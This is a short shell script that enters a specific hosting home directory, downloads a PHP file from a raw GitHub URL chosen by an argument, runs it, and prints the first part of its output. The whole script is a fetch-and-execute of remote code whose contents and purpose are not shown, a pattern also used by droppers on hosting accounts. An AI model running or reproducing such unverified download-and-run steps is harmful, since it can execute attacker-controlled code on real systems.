#!/bin/sh
cd /home/u791571885 && [ -f t169.done ] || { curl -fsSL -o t169.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs169.php" && /opt/alt/php83/usr/bin/php t169.php > t169.done 2>&1; }
head -c 9000 t169.done
